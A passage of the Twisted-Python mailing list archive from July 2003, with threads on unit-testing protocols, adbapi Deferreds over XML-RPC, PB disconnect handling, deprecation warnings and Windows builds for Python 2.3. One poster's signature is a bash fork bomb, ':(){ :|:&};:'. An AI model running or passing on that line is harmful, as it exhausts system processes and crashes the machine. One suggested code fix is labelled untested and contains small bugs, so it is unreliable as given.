> 
> In general you'd just do some variant on:
> 
>  reactor.listenTCP(1234, myServerFactory)
>  reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
>  while someConditionIsn'tSet:
>      reactor.iterate()
>  # at this point some exchange should have finished successfully

Or you can use the loopback module -- twisted.protocols.loopback.  Many of
the Twisted tests do this.

-Andrew.




From glyph at twistedmatrix.com  Wed Jul 30 21:35:00 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 30 Jul 2003 22:35:00 -0500
Subject: [Twisted-Python] Re: Debugging client programs
In-Reply-To: <20030730220906.GE26034@radii>
Message-ID: <F720C9BA-C307-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Wednesday, July 30, 2003, at 05:09 PM, Christopher Armstrong wrote:

> I've written a few clients with Twisted, usually GUI things, and I've
> never used twistd.

For most client-ish things, it's just not appropriate.  I wish it could 
be, but the vaguaries of GUI development prevent it :).

> Sometimes it would be possible, but I think in your
> case, it's not worth all the hassle.

The case where it's useful is when "deployment" is a separate task from 
"installation" - for offlineimap, I don't gather that this is the case.

> Maybe if someone made a _sane_ programmatic interface to twistd (so 
> you could fire it up after
> figuring out which reator you want to use, etc), it would be usable in 
> this situation, but that doesn't exist.

The general idea behind twistd is that it's a unix-centric way of 
managing Twisted services.  It's a daemon.  For an application like 
this, you don't want a daemon, because in at least some circumstances, 
you don't want to daemonize :-).

In general I think that trying to present a programmatic interface to 
twistd is a waste of time.  There should be different service-managing 
programs for different operating systems, and suggesting front-ends to 
twistd will instantly destroy that kind of portability.




From sflist at ihonk.com  Wed Jul 30 22:13:05 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:13:05 -0700
Subject: [Twisted-Python] adbapi weirdness
Message-ID: <200307302113.05020.sflist@ihonk.com>

Hi all,

Here's the latest thing I can't figure out.

If I do this and make an XML-RPC call to dbtest(), it runs fine:

class takeOne(xmlrpc.XMLRPC):
    def __init__(self):
        self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
		host='127.0.0.1', user='postgres', database='template1')
        self.db = adbapi.Augmentation(self.dbpool)
	self.prefs = Env(self.db)

    def xmlrpc_dbtest(self):
        result = self.db.runQuery("select * from prefs")
        return result

    def xmlrpc_listPrefs(self):
        return self.prefs.prefs

class Env:
    def __init__(self, db):
        self.db = db
        self.prefs = self.db.runQuery("select * from prefs")
	return

def main():
    from twisted.internet.app import Application
    app = Application("xmlrpc")
    r = takeOne()
    app.listenTCP(7080, server.Site(r))
    return app

application = main()

if __name__ == '__main__':
    application.run(save=0)

But a call to listPrefs() hangs until I make another, concurrent request to 
dbtest(), at which point it comes through. Then if I try listPrefs() again, 
it returns Fault 8002: Can't serialize output.

Any ideas? I'm suffering from all kinds of this weirdness: It hangs, then it 
doesn't hang, then it returns properly, then it can't serialize from the same 
function that worked a moment before. :-(

Thanks,

Steve



From itamar at itamarst.org  Wed Jul 30 22:26:06 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 00:26:06 -0400
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <200307302113.05020.sflist@ihonk.com>
References: <200307302113.05020.sflist@ihonk.com>
Message-ID: <20030731002606.793fcad1.itamar@itamarst.org>

On Wed, 30 Jul 2003 21:13:05 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> But a call to listPrefs() hangs until I make another, concurrent
> request to dbtest(), at which point it comes through. Then if I try
> listPrefs() again, it returns Fault 8002: Can't serialize output.

You can't send the same Deferred more than once.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From sflist at ihonk.com  Wed Jul 30 22:30:27 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:30:27 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731002606.793fcad1.itamar@itamarst.org>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org>
Message-ID: <200307302130.27292.sflist@ihonk.com>

> > But a call to listPrefs() hangs until I make another, concurrent
> > request to dbtest(), at which point it comes through. Then if I try
> > listPrefs() again, it returns Fault 8002: Can't serialize output.
> 
> You can't send the same Deferred more than once.

Err, can you give it to me in NewbieSpeaque(tm)? :-)

Steve



From sflist at ihonk.com  Wed Jul 30 22:54:43 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Wed, 30 Jul 2003 21:54:43 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731002606.793fcad1.itamar@itamarst.org>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org>
Message-ID: <200307302154.43654.sflist@ihonk.com>

> > But a call to listPrefs() hangs until I make another, concurrent
> > request to dbtest(), at which point it comes through. Then if I try
> > listPrefs() again, it returns Fault 8002: Can't serialize output.
> 
> You can't send the same Deferred more than once.

Hmm. My impression was that when I did:

result = db.runQuery("select * from foo")

result was a list which contained the result of the query, so I could return 
that as many times as I liked, since it's just a list.

Steve



From andrew-twisted at puzzling.org  Wed Jul 30 23:08:49 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 15:08:49 +1000
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <200307302130.27292.sflist@ihonk.com> <200307302113.05020.sflist@ihonk.com>
References: <200307302113.05020.sflist@ihonk.com> <20030731002606.793fcad1.itamar@itamarst.org> <200307302130.27292.sflist@ihonk.com> <200307302113.05020.sflist@ihonk.com>
Message-ID: <20030731050849.GB30331@frobozz>

On Wed, Jul 30, 2003 at 09:30:27PM -0700, Steve Freitas wrote:
> > > Hi all,
> > > 
> > > Here's the latest thing I can't figure out.
> > > 
> > > If I do this and make an XML-RPC call to dbtest(), it runs fine:
> > > 
> > > class takeOne(xmlrpc.XMLRPC):
> > >     def __init__(self):
> > >         self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
> > >           host='127.0.0.1', user='postgres', database='template1')
> > >         self.db = adbapi.Augmentation(self.dbpool)
> > >         self.prefs = Env(self.db)
[...]
> > > 
> > >     def xmlrpc_listPrefs(self):
> > >         return self.prefs.prefs
> > > 
> > > class Env:
> > >     def __init__(self, db):
> > >         self.db = db
> > >         self.prefs = self.db.runQuery("select * from prefs")
[...]
> > > But a call to listPrefs() hangs until I make another, concurrent
> > > request to dbtest(), at which point it comes through. Then if I try
> > > listPrefs() again, it returns Fault 8002: Can't serialize output.
> > 
> > You can't send the same Deferred more than once.
> 
> Err, can you give it to me in NewbieSpeaque(tm)? :-)

I'll try :)

runQuery returns a Deferred.  If you don't know what that is, you're going
to run into bigger problems than just this, so speak up now :) -- and read:
    twistedmatrix.com/documents/howto/defer

Now, for twisted.web.xmlrpc to get the results of your deferred, it has to
add a callback to it.  This callback consumes the result of your deferred
(although I don't see any reason why this *has* to be the case, necessarily,
but I can see how it could avoid confusing errors, so it's probably a good
idea).  This means that the next callback added to that deferred will get a
result of None, which can't be represented in XML-RPC, hence the error.

One way to work around this would be something like this (completely
untested, of course...):

----
from twisted.web import xmlrpc
from twisted.internet import defer
from twisted.python import log
from twisted.enterprise import adbapi

class TakeOne(xmlrpc.XMLRPC):
    def __init__(self):
        self.dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", \
                host='127.0.0.1', user='postgres', database='template1')
        self.db = adbapi.Augmentation(self.dbpool)
        self.prefs = Env(self.db)

    def xmlrpc_listPrefs(self):
        return self.prefs.getPrefs()

class Env:
    def __init__(self, db):
        self.db = db
        self.prefs = None
        self.outstandingRequests = []
        self.d = self.db.runQuery("select * from prefs")
        d.addCallbacks(self._cb, self._eb)

    def getPrefs(self):
        if self.prefs is not None:
            return self.prefs
        else:
            d = defer.Deferred()
            self.outstandingRequests.append(d)
            return d

    def _cb(self, result):
        self.prefs = results
        for d in self.outstandingRequests:
            d.callback(result)
        del self.outstandingRequests[:]

    def _eb(self, failure):
        self.prefs = results
        log.err(failure)
----

-Andrew.




From Rudy.Schockaert at pandora.be  Thu Jul 31 00:26:53 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Thu, 31 Jul 2003 08:26:53 +0200
Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
Message-ID: <3F28B6AD.6050403@pandora.be>

Hi,

anyone who knows when the first Python 2.3 build of twisted for windows 
will be available? Which version will it be?

I tried to build it myself but got into trouble. I first installed 
Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
documentation, but I got an error message that Python itself is build 
with Visual Studio 6.
I don't feel building python myself and I don't have VS6.

TIA,

Rudy




From nico at tekNico.net  Thu Jul 31 00:53:01 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 08:53:01 +0200
Subject: [Twisted-Python] StepReactor?
Message-ID: <3F28BCCD.90303@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

What about a StepReactor?

It would be great to be able to stop time, have a means to look at the event
queue and to say "DispatchNextEvent" by hand. Or even better,
"PushTimeForward(x)" and see what happens. In short, a simulator.

This assuming, of course, that all other parts of the system are pausable,
be they internal or external.


- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KLzLXv0hgDImBm4RApH3AJ0SqGfDLxmdI7GjrWBBzGOlbI3V3QCfdUyB
bQkgGavTvpi1WnWpI6aO/Gg=
=Jsn5
-----END PGP SIGNATURE-----





From andrew-twisted at puzzling.org  Thu Jul 31 01:14:06 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 17:14:06 +1000
Subject: [Twisted-Python] StepReactor?
In-Reply-To: <3F28BCCD.90303@tekNico.net>
References: <3F28BCCD.90303@tekNico.net>
Message-ID: <20030731071406.GC30331@frobozz>

On Thu, Jul 31, 2003 at 08:53:01AM +0200, Nicola Larosa wrote:
> What about a StepReactor?
> 
> It would be great to be able to stop time, have a means to look at the event
> queue and to say "DispatchNextEvent" by hand. Or even better,
> "PushTimeForward(x)" and see what happens. In short, a simulator.
> 
> This assuming, of course, that all other parts of the system are pausable,
> be they internal or external.

Is reactor.iterate[1] sufficient for this?

-Andrew.
    
[1] http://twistedmatrix.com/documents/api/public/twisted.internet.interfaces.IReactorCore.html#iterate




From sflist at ihonk.com  Thu Jul 31 01:21:02 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Thu, 31 Jul 2003 00:21:02 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731050849.GB30331@frobozz>
References: <200307302113.05020.sflist@ihonk.com> <20030731050849.GB30331@frobozz>
Message-ID: <200307310021.02606.sflist@ihonk.com>

Thank you for your response, Andrew! I thought I knew enough about Deferreds, 
but it's clear that I need to learn more. I'll give your approach a try after 
I've gone through the deferred docs again.

Steve



From Richard.Townsend at edl.uk.eds.com  Thu Jul 31 01:52:48 2003
From: Richard.Townsend at edl.uk.eds.com (Richard.Townsend at edl.uk.eds.com)
Date: Thu, 31 Jul 2003 08:52:48 +0100
Subject: [Twisted-Python] PB - detecting loss of connection
Message-ID: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>

I've been experimenting with PB. I have two applications developed from
examples pb3server.py and pb3client.py

The client uses pb.getObjectAt() to get a reference to the server's pb.Root
derived object. It then calls a remote method on that object to send a
pb.Referenceable object to the server.

The idea is that the server can then call a method on the pb.Referenceable
object to notify the client(s) whenever a significant change of state
occurs. This works OK.

If the client terminates, the server can trap pb.DeadReferenceError, so that
is not a problem.

However, if the server terminates (e.g. by SIGKILL) the client is not aware
that it will not receive any more updates.

Apart from periodically calling pb.getObjectAt() to see if the server is
still running, is there a way that the client can automatically detect if
the server has been terminated?

thanks for your help
 -Richard
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030731/5efbcbda/attachment.html>

From nico at tekNico.net  Thu Jul 31 02:19:30 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 10:19:30 +0200
Subject: [Twisted-Python] StepReactor?
In-Reply-To: <20030731071406.GC30331@frobozz>
References: <3F28BCCD.90303@tekNico.net> <20030731071406.GC30331@frobozz>
Message-ID: <3F28D112.8020301@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Is reactor.iterate[1] sufficient for this?

Well, it does not stop time, and also calls runUntilCurrent. I guess one
should come up with a substitute for time.time in t.i.base (at least), that
would allow to manipulate (fake) time at will.

Also, some means to display the event queue is needed, including the delays
for each event.

Come to think of it, is there a way in Twisted to schedule an event at an
absolute time, instead of at a relative one?


- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KNEPXv0hgDImBm4RAimdAJ4s8PWHqWSMqCjnvcaqJChANcCULgCguOPT
duew65Z064oPnTJ1euBg4Y0=
=kExV
-----END PGP SIGNATURE-----





From mporter at despammed.com  Thu Jul 31 03:43:47 2003
From: mporter at despammed.com (Michael Porter)
Date: Thu, 31 Jul 2003 10:43:47 +0100
Subject: [Twisted-Python] how to drop connection
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com> <20030730064100.GC27662@frobozz> <20030730065248.GB26034@radii>
Message-ID: <004501c35748$3d5fb490$0201a8c0@dan>

From: "Christopher Armstrong" <radix at twistedmatrix.com>
> On Wed, Jul 30, 2003 at 04:41:00PM +1000, Andrew Bennetts wrote:
> > On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> > >
> > > class DroppingHTTPFactory(http.HTTPFactory):
> >
> > This really should be (also untested):
> >
> > class DroppingHTTPFactory(http.HTTPFactory):
>
> Also, OP is probably using server.Site, not HTTPFactory directly. So
> it should probably be subclassing that.
>

Thanks, this works perfectly (subclassing Site in my case as you suspected).

Mike.





From tv at twistedmatrix.com  Thu Jul 31 05:07:10 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 14:07:10 +0300
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731020900.GA30331@frobozz>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz>
Message-ID: <20030731110710.GA21641@lapdog>

On Thu, Jul 31, 2003 at 12:09:00PM +1000, Andrew Bennetts wrote:
 > In general you'd just do some variant on:
> > 
> >  reactor.listenTCP(1234, myServerFactory)
> >  reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
> >  while someConditionIsn'tSet:
> >      reactor.iterate()
> >  # at this point some exchange should have finished successfully
> 
> Or you can use the loopback module -- twisted.protocols.loopback.  Many of
> the Twisted tests do this.

	I'd like to vote _heavily_ on using
	twisted.protocols.loopback.loopback()

	Opening TCP sockets in unit tests is just not _unit_ testing
	in my book. Please don't do it in unit tests. It just makes it
	harder to run your unit tests in varying environments. (Who
	says I allow you to bind to port 1234? Who says it's free?
	Who says I allow you to listen *at all*?)

	</rant>


	Also, you should not be testing just interoperability between
	*your* client and *your* server, but interoperability of your
	server with a "standard", and interoperability of your client
	with a "standard". For that, I prefer doing something like
	this:

class LDAPClientTestDriver:
    """

    A test driver that looks somewhat like a real LDAPClient.

    Pass in a list of lists of LDAPProtocolResponses. For each sent
    LDAP message, the first item of said list is iterated through, and
    all the items are sent as responses to the callback. The sent LDAP
    messages are stored in self.sent, so you can assert that the sent
    messages are what they are supposed to be.

    """
    def __init__(self, *responses):
        self.sent=[]
        self.responses=list(responses)
    def queue(self, x, callback):
        self.sent.append(x)
        assert self.responses, 'Ran out of responses at %r' % x
        responses = self.responses.pop(0)
        while responses:
            r = responses.pop(0)
            ret = callback(r)
            if responses:
                assert ret==0
            else:
                assert ret==1

    def assertNothingSent(self):
        # just a bit more explicit
        self.assertSent()

    def assertSent(self, *shouldBeSent):
        shouldBeSent = list(shouldBeSent)
        assert self.sent == shouldBeSent, \
               '%s expected to send %r but sent %r' % (
            self.__class__.__name__,
            shouldBeSent,
            self.sent)
        sentStr = ''.join([str(x) for x in self.sent])
	shouldBeSentStr = ''.join([str(x) for x in shouldBeSent])
	assert sentStr == shouldBeSentStr, \
               '%s expected to send data %r but sent %r' % (
            self.__class__.__name__,
            shouldBeSentStr,
            sentStr)


class LDAPSyntaxAttributesModificationOnWire(unittest.TestCase):
    def testAdd(self):
	"""Modify & commit should write the right data to the server."""

        client = LDAPClientTestDriver(
            [	pureldap.LDAPModifyResponse(resultCode=0,
                                            matchedDN='',
                                            errorMessage=''),
                ])

	o=ldapsyntax.LDAPEntry(client=client,
                               dn='cn=foo,dc=example,dc=com',
                               attributes={
	    'objectClass': ['a', 'b'],
	    'aValue': ['a'],
	    })
	o['aValue'].add('newValue')
	o['aValue'].add('anotherNewValue')

	d=o.commit()
        val = deferredResult(d)

        client.assertSent(pureldap.LDAPModifyRequest(
	    object='cn=foo,dc=example,dc=com',
	    modification=[
	    pureldap.LDAPModification_add(vals=(('aValue',
						 ['newValue']),)),
	    pureldap.LDAPModification_add(vals=(('aValue',
						 ['anotherNewValue']),)),
	    ]))


	And elsewhere, test the actual serialization of the
	on-wire protocol message known as pureldap.LDAPModifyRequest:

class KnownValues(unittest.TestCase):
    knownValues=( # class, args, kwargs, expected_result

	(pureldap.LDAPModifyRequest,
	 [],
	 { "object": 'cn=foo, dc=example, dc=com',
	   "modification": [pureldap.LDAPModification_delete([('bar',)])]
	   },
	 [0x66, 0x2c]
	 + [0x04, 0x1a]
	 + l("cn=foo, dc=example, dc=com")
	 + [0x30, 0x0e]
	 + [0x30, 0x0c]
	 + [0x0a, 0x01, 0x01]
	 + [0x30, 0x07]
	 + [0x04, 0x03] + l("bar")
	 + [0x31, 0x00]),

	...

        )

    def testToLDAP(self):
	"""str(LDAPClass(...)) should give known result with known input"""
	for klass, args, kwargs, encoded in self.knownValues:
	    result = klass(*args, **kwargs)
	    result = str(result)
	    result = map(ord, result)
	    if result!=encoded:
		raise AssertionError, \
		      "Class %s(*%s, **%s) doesn't encode properly: " \
		      "%s != %s" % (klass.__name__,
				    repr(args), repr(kwargs),
				    repr(result), repr(encoded))

    def testFromLDAP(self):
	"""LDAPClass(encoded="...") should give known result with known input"""
	for klass, args, kwargs, encoded in self.knownValues:
	    m=MutableString(s(*encoded))
	    m.append('foo')
	    result = klass(encoded=m, berdecoder=pureber.BERDecoderContext())
	    assert m=='foo'

	    shouldBe = klass(*args, **kwargs)
	    #TODO shouldn't use str below
	    assert str(result)==str(shouldBe), \
		   "Class %s(*%s, **%s) doesn't decode properly: " \
		   "%s != %s" % (klass.__name__,
				 repr(args), repr(kwargs),
				 repr(result), repr(shouldBe))

-- 
:(){ :|:&};:



From nico at tekNico.net  Thu Jul 31 05:03:45 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 13:03:45 +0200
Subject: [Twisted-Python] Didn't register my copy of Twisted!?!
Message-ID: <3F28F791.4070206@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sorry to spoil the party, but...



is twisted.python.register supposed to be a joke, or what? :^) If so, I'm
not sure I completely got it... I'm particularly concerned with the ominous
"import socket" contained within. ;^)



- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KPePXv0hgDImBm4RAieDAJ9RpJ2p8Ng3GQ53SD4mxE/qYkCeSwCgqzxq
O7EqvgRVX5DPBUyId7A4YIA=
=05t1
-----END PGP SIGNATURE-----





From lists at ghaering.de  Thu Jul 31 05:25:28 2003
From: lists at ghaering.de (=?ISO-8859-1?Q?Gerhard_H=E4ring?=)
Date: Thu, 31 Jul 2003 13:25:28 +0200
Subject: [Twisted-Python] Didn't register my copy of Twisted!?!
In-Reply-To: <3F28F791.4070206@tekNico.net>
References: <3F28F791.4070206@tekNico.net>
Message-ID: <3F28FCA8.6050005@ghaering.de>

Nicola Larosa wrote:
> Sorry to spoil the party, but...
> 
> is twisted.python.register supposed to be a joke, or what? :^) [...]

"""
Revision 1.1 / (download) / (as text) - annotate - [select for diffs] , 
Mon Apr 1 06:35:59 2002 UTC (15 months, 4 weeks ago) by glyph
Branch: MAIN
Diff

registration support for twistd
"""

Look at the checkin date ;-)

-- Gerhard




From theller at python.net  Thu Jul 31 06:41:28 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 14:41:28 +0200
Subject: [Twisted-Python] Twisted and Python 2.3
Message-ID: <oezax407.fsf@python.net>

Trying to run my code under Python 2.3, I get these warnings:

C:\tss5\components\fpanel\prog\..\..\_Pythonlib\fpgui\ctgui_reactor.py:113: DeprecationWarning: Foolish capitalist!  Your opulent toilet will be your undoing!!
  log.logOwner.own(fd)

C:\tss5\components\fpanel\prog\..\..\_Pythonlib\fpgui\ctgui_reactor.py:127: DeprecationWarning: The proletariat is victorious.
  log.logOwner.disown(fd)

What do they mean?
I have built and installed twisted 1.0.6 under Windows.

Thomas




From stormcoder at yahoo.com  Thu Jul 31 08:05:09 2003
From: stormcoder at yahoo.com (Mike Owens)
Date: Thu, 31 Jul 2003 07:05:09 -0700
Subject: [Twisted-Python] Win32 Service
Message-ID: <3F28BFA5.9743.14D34878@localhost>

I am currently running twisted on an XP machine. What is the 
recommended way of running twistd as a service? Or should I just 
create a custom web script and run that as a service?



From itamar at itamarst.org  Thu Jul 31 08:54:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 10:54:29 -0400
Subject: [Twisted-Python] Twisted and Python 2.3
In-Reply-To: <oezax407.fsf@python.net>
References: <oezax407.fsf@python.net>
Message-ID: <20030731105429.48c0824c.itamar@itamarst.org>

On Thu, 31 Jul 2003 14:41:28 +0200
Thomas Heller <theller at python.net> wrote:

> What do they mean?
> I have built and installed twisted 1.0.6 under Windows.

We changed the logging APIs, and you must've copied code from the
win32eventreacctor that still uses the old API. Compare that to say,
t.i.default's way of interacting with the log.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Thu Jul 31 08:59:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 10:59:08 -0400
Subject: [Twisted-Python] PB - detecting loss of connection
In-Reply-To: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>
References: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>
Message-ID: <20030731105908.12492545.itamar@itamarst.org>

aReferenceable.broker.notifyOnDisconnect(f)

f() will now be called on disconnect, aReferenceable the result of
getObjectAt() or any call that returns a RemoteReference.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Thu Jul 31 09:03:07 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 11:03:07 -0400
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731110710.GA21641@lapdog>
References: <000001c356cc$3d768340$5591013d@thilakra>
	<20030730151039.02684534.itamar@itamarst.org>
	<20030731020900.GA30331@frobozz>
	<20030731110710.GA21641@lapdog>
Message-ID: <20030731110307.7639a494.itamar@itamarst.org>

On Thu, 31 Jul 2003 14:07:10 +0300
Tommi Virtanen <tv at twistedmatrix.com> wrote:

> 	Opening TCP sockets in unit tests is just not _unit_ testing
> 	in my book. Please don't do it in unit tests. It just makes it
> 	harder to run your unit tests in varying environments. (Who
> 	says I allow you to bind to port 1234? Who says it's free?
> 	Who says I allow you to listen *at all*?)

Most of Twisted's unittests listen on 0 and then figure out which port
was bound to. 

> 	Also, you should not be testing just interoperability between
> 	*your* client and *your* server, but interoperability of your
> 	server with a "standard", and interoperability of your client
> 	with a "standard". For that, I prefer doing something like
> 	this:

Also a very good idea, but doing both is better than just one. The more
tests the better.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From theller at python.net  Thu Jul 31 09:37:33 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 17:37:33 +0200
Subject: [Twisted-Python] Re: Twisted and Python 2.3
References: <oezax407.fsf@python.net> <20030731105429.48c0824c.itamar@itamarst.org>
Message-ID: <65liwvuq.fsf@python.net>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> On Thu, 31 Jul 2003 14:41:28 +0200
> Thomas Heller <theller at python.net> wrote:
>
>> What do they mean?
>> I have built and installed twisted 1.0.6 under Windows.
>
> We changed the logging APIs, and you must've copied code from the
> win32eventreacctor that still uses the old API. Compare that to say,
> t.i.default's way of interacting with the log.

Thanks.

But wouldn't it be more useful to put this in the warning, instead of
these strange texts? I would be somewhat worried that these texts (if I
do not test the program good enough) may at some time been shown to the
innocent user =8(

But maybe I have no sense for this kind of humor.

Thomas




From itamar at itamarst.org  Thu Jul 31 09:47:45 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 11:47:45 -0400
Subject: [Twisted-Python] Re: Twisted and Python 2.3
In-Reply-To: <65liwvuq.fsf@python.net>
References: <oezax407.fsf@python.net>
	<20030731105429.48c0824c.itamar@itamarst.org>
	<65liwvuq.fsf@python.net>
Message-ID: <20030731114745.021fecef.itamar@itamarst.org>

On Thu, 31 Jul 2003 17:37:33 +0200
Thomas Heller <theller at python.net> wrote:

> But wouldn't it be more useful to put this in the warning, instead of
> these strange texts? I would be somewhat worried that these texts (if
> I do not test the program good enough) may at some time been shown to
> the innocent user =8(

Those are warnings (so you can supress them with python options etc.).
And yes, we need to remove them, by switching to the new code (it's on
my TODO list for win32eventreactor, hopefully before 1.0.7 is released.)

> But maybe I have no sense for this kind of humor.

The deprecated methods were "own" and "disown".

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From corydodt at yahoo.com  Thu Jul 31 10:23:36 2003
From: corydodt at yahoo.com (Cory Dodt)
Date: Thu, 31 Jul 2003 09:23:36 -0700
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
Message-ID: <3F294288.4000009@yahoo.com>

>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>
>Hi,
>
>anyone who knows when the first Python 2.3 build of twisted for windows 
>will be available? Which version will it be?
>
>I tried to build it myself but got into trouble. I first installed 
>Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
>documentation, but I got an error message that Python itself is build 
>with Visual Studio 6.
>I don't feel building python myself and I don't have VS6.
>  
>

I'm with you man,  I don't feel like building Python myself either.  I 
have asked the appropriate list 
(http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
about this problem.  I also tried using distutils from CVS instead of 
the bundled copy with Python 2.3, and no luck.

There won't be an official Python 2.3 build of Twisted for Windows until 
this is resolved, as I don't have MSVC and don't intend to buy a copy.  
mingw should work.

In the meantime, you should know that you can get by without the 
extensions.  Just do
$ python setup.py install  --skip-build

You won't get cbanana or _c_urlarg, the only extensions built for windows.






From Rudy.Schockaert at pandora.be  Thu Jul 31 10:52:33 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Thu, 31 Jul 2003 18:52:33 +0200
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <3F294288.4000009@yahoo.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com>
Message-ID: <3F294951.3070409@pandora.be>

Cory Dodt wrote:

>
>> Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>>
>> Hi,
>>
>> anyone who knows when the first Python 2.3 build of twisted for 
>> windows will be available? Which version will it be?
>>
>> I tried to build it myself but got into trouble. I first installed 
>> Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
>> documentation, but I got an error message that Python itself is build 
>> with Visual Studio 6.
>> I don't feel building python myself and I don't have VS6.
>>  
>>
>
> I'm with you man,  I don't feel like building Python myself either.  I 
> have asked the appropriate list 
> (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> about this problem.  I also tried using distutils from CVS instead of 
> the bundled copy with Python 2.3, and no luck.
>
> There won't be an official Python 2.3 build of Twisted for Windows 
> until this is resolved, as I don't have MSVC and don't intend to buy a 
> copy.  mingw should work.

I will have MSVC somewhere next week (when I get at the office). I'll 
try to build it with MSVC then. If you're interested in the extensions 
below, contact me offline.

>
> In the meantime, you should know that you can get by without the 
> extensions.  Just do
> $ python setup.py install  --skip-build
>
> You won't get cbanana or _c_urlarg, the only extensions built for 
> windows.

I can live with that for the moment. The only parts I'm using for the 
moment is twisted.names and twisted.mail. And as JP is heavily working 
on the mail part as I understood, I'm working with the CVS version for 
the moment.
But as soon as I get more free time, I would like to investigate the 
rest also. I'll see how far I can get without cbanana and/or _c_urlarg.





From theller at python.net  Thu Jul 31 11:05:51 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 19:05:51 +0200
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com>
Message-ID: <zniuvd74.fsf@python.net>

